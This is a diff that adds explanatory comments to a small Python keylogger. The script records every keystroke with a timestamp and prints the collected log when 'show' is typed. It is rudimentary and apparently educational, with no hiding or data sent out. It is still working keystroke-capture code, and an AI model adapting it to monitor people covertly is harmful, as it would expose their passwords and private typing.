@@ -1,11 +1,11 @@
-import keyboard
-from datetime import datetime
+import keyboard                      #Import a library that records keyboard keystrokes.
+from datetime import datetime            #Import a library that records date and time.
 
 
-dicti = {}
+dicti = {}                                          #A dictionary for saving input from the keyboard.
 dicti_for_show = {"all times":''}
 
-def on_key_press(key):
+def on_key_press(key):                             #A function that receives input from another function (which records the keyboard), and inserts it into a dictionary entry whose key is the current date and time.
     global dicti_for_show,dicti
     key = key.name
     key = key.lower()
@@ -17,11 +17,11 @@ def on_key_press(key):
 
     dicti[currentTime] += key
     dicti_for_show["all times"] += key
-    #print(key)
+
 
     if "show" in dicti_for_show["all times"]:
-        for k,v in dicti.items():
-            print()
+        for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
+            print()                          #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
             print(k)
             print(v)
             print()
@@ -33,5 +33,5 @@ def on_key_press(key):
 
 
 
-keyboard.on_press(on_key_press)
-keyboard.wait('Ctrl + Shift + .')
+keyboard.on_press(on_key_press)               #function call.
+keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.
